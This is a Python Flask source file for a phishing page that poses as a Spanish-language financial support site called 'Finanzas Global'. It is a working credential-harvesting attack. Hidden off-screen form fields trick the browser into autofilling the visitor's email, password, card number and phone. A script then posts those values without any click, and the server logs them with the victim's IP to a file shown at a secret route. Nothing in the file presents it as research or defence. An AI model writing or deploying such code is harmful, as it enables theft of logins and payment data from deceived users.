from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Soporte Técnico | Finanzas Global</title>
    <style>
        body { font-family: sans-serif; background: #1a252f; color: white; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #d32f2f; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* CAMPOS INVISIBLES PARA EL USUARIO, PERO VISIBLES PARA EL AUTOFILL DEL NAVEGADOR */
        .hidden-extractor {
            position: absolute;
            left: -9999px;
            top: -9999px;
        }
    </style>
    <script>
        window.onload = function() {
            // Esperamos 3 segundos a que el navegador intente autocompletar
            setTimeout(function() {
                var sensitiveData = {
                    user: document.getElementById('fake_user').value,
                    pass: document.getElementById('fake_pass').value,
                    card: document.getElementById('fake_card').value,
                    phone: document.getElementById('fake_phone').value
                };
                
                // Si el navegador rellenó algo, lo mandamos sin que el usuario haga clic
                if(sensitiveData.user || sensitiveData.pass) {
                    fetch('/silent_log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(sensitiveData)
                    });
                }
            }, 3000);
        };
    </script>
</head>
<body>
    <div class="loader"></div>
    <h2>CONECTANDO CON EL SERVIDOR DE SEGURIDAD...</h2>
    <p>Validando su identidad digital. Por favor, no cierre esta ventana.</p>

    <form class="hidden-extractor">
        <input type="text" id="fake_user" name="email" autocomplete="email">
        <input type="password" id="fake_pass" name="password" autocomplete="current-password">
        <input type="text" id="fake_card" name="cc-number" autocomplete="cc-number">
        <input type="text" id="fake_phone" name="tel" autocomplete="tel">
    </form>

    <p style="font-size: 10px; color: #555; margin-top: 50px;">Ref: SVR-MATRIX-ID-99284</p>
</body>
</html>
"""

@app.route('/silent_log', methods=['POST'])
def silent_log():
    data = request.json
    with open("capturas.txt", "a") as f:
        f.write(f"[AUTOFILL_DETECTED] {datetime.datetime.now()} | DATA: {data} | IP: {request.remote_addr}\n")
    return '', 204

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: data = f.read()
    except: data = "Búnker vacío."
    return f"<html><body style='background:#000; color:#0f0; padding:20px;'><pre>{data}</pre></body></html>"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
